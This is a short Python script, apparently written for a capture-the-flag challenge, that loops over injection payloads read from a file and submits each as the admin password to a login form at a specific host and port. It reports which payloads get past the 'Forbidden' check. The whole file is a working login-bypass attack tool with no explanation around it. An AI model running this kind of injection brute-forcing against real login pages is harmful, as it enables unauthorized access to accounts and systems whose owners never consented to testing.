import requests
import re

url = "http://jh2i.com:50006/"
#Headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": url , "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
Headers = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5"
, "Accept-Encoding": "gzip, deflate"
,"Content-Type": "application/x-www-form-urlencoded",

"Referer": "http://jh2i.com:50006/"
,"Upgrade-Insecure-Requests": "1"}

Payloads = open('injection.txt','r')

for payload in Payloads:
    payload = payload.strip()
    Data = {"username": "admin", "password": payload, "submit" : "Login"}
    success = requests.post(url, headers=Headers, data=Data)
    error1 = re.findall('Forbidden', success.text)
    print(success.text)
    #error2 = re.findall('Attempting to login as more than one user!??', success.text)
    #if len(error1) == 0 and len(error2):
    print(error1 , payload)
    if len(error1) == 0:
        if success.status_code == 200:
            print("success" , payload)

